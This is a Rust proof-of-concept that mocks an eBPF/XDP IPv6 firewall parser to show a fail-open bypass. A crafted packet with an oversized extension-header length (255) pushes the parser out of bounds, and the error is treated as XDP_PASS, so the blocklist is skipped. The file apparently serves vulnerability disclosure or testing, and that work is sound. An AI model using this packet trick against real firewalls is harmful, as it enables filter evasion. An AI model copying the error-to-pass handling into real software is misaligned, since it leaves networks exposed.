// This script mocks the eBPF parser logic to mathematically prove the bypass vulnerability.
// It compiles in userspace and simulates `ptr_at` and `try_xdp_ipv6`.

use std::mem;

// Mock context to simulate eBPF packet boundaries
struct MockContext {
    data: Vec<u8>,
}

impl MockContext {
    fn data_start(&self) -> usize {
        self.data.as_ptr() as usize
    }
    fn data_end(&self) -> usize {
        self.data.as_ptr() as usize + self.data.len()
    }
}

// Mock ptr_at function exactly as in BPF
fn ptr_at<T>(ctx: &MockContext, offset: usize) -> Result<*const T, ()> {
    let start = ctx.data_start();
    let end = ctx.data_end();
    let len = mem::size_of::<T>();

    if start + offset + len > end {
        return Err(()); // This is what triggers the Fail-Open!
    }

    Ok((start + offset) as *const T)
}

#[repr(C)]
struct Ipv6ExtHdr {
    next_header: u8,
    hdr_ext_len: u8,
}

fn try_xdp_ipv6(ctx: &MockContext, ip_offset: usize) -> Result<bool, ()> {
    let base_header_len = 40;
    let mut current_nh = 0; // 0 = Hop-by-Hop
    let mut l4_offset = ip_offset + base_header_len;
    let mut is_valid_l4 = false;

    for _ in 0..4 {
        match current_nh {
            6 | 17 => { // TCP / UDP
                is_valid_l4 = true;
                break;
            }
            0 | 43 | 60 => { // HOP, ROUTING, DEST
                let ext_hdr: *const Ipv6ExtHdr = ptr_at(ctx, l4_offset)?;
                current_nh = unsafe { (*ext_hdr).next_header };
                let ext_len = unsafe { (*ext_hdr).hdr_ext_len };
                
                // Attack happens here: if ext_len is huge, next l4_offset will be outside packet.
                l4_offset += ((ext_len as usize) + 1) * 8;
            }
            _ => break,
        }
    }

    if !is_valid_l4 {
        println!("[-] Dropped: Invalid L4 chain");
        return Ok(false); // DROP
    }

    // Now try to parse L4 ports (this is where it fails out of bounds!)
    if current_nh == 6 || current_nh == 17 {
        let _sp: *const u16 = ptr_at(ctx, l4_offset)?;
        println!("[+] Parsed L4 ports successfully.");
    }

    // Now we check the blocklist
    println!("[!] VULNERABILITY TRIGGERED? No, if we get here blocklist works.");
    Ok(true)
}

fn xdp_firewall(ctx: &MockContext) -> bool {
    match try_xdp_ipv6(ctx, 0) {
        Ok(ret) => ret,
        Err(_) => {
            println!("[!] VULNERABILITY TRIGGERED: ptr_at failed, returning XDP_PASS (Fail-Open)!");
            true // PASS (Bypass)
        }
    }
}

fn main() {
    println!("--- Test 1: Normal Packet (Should hit blocklist logic) ---");
    // Mock 60 bytes: 40 bytes IPv6 + 8 bytes HopByHop (ext_len=0) + 12 bytes UDP payload
    let mut normal_packet = vec![0u8; 60];
    normal_packet[40] = 17; // Next Header = UDP
    normal_packet[41] = 0;  // hdr_ext_len = 0 (8 bytes)
    
    let ctx_normal = MockContext { data: normal_packet };
    xdp_firewall(&ctx_normal);


    println!("\n--- Test 2: Malicious Packet (Bypass attempt) ---");
    // Malicious packet claims extension header is 255 (2048 bytes), but packet is only 60 bytes long!
    let mut malicious_packet = vec![0u8; 60];
    malicious_packet[40] = 17; // Next Header = UDP
    malicious_packet[41] = 255; // MALICIOUS LENGTH
    
    let ctx_malicious = MockContext { data: malicious_packet };
    xdp_firewall(&ctx_malicious);
}
